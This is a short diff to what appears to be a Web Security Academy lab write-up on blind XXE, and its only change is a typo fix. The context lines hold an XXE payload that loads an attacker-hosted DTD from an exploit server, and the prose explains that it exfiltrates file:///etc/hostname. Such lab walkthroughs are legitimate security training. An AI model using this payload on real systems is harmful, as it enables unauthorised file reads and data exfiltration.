@@ -86,7 +86,4 @@ Cookie: session=xrE9xNnbe9G6HNdNkxEzu7RMWW3a1LjZ
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://acc51fc41e40cc5c80f320ff01f500d0.web-security-academy.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
 
-The main part of the request is at tghe bottom where we call our malicious `dtd` to exfiltrate data, once the `XML` parser makes the request we should now have access to the data it grabbed because of the call in out payload to `SYSTEM file:///etc/hostname`
-
-
-
+The main part of the request is at the bottom where we call our malicious `dtd` to exfiltrate data, once the `XML` parser makes the request we should now have access to the data it grabbed because of the call in out payload to `SYSTEM file:///etc/hostname`
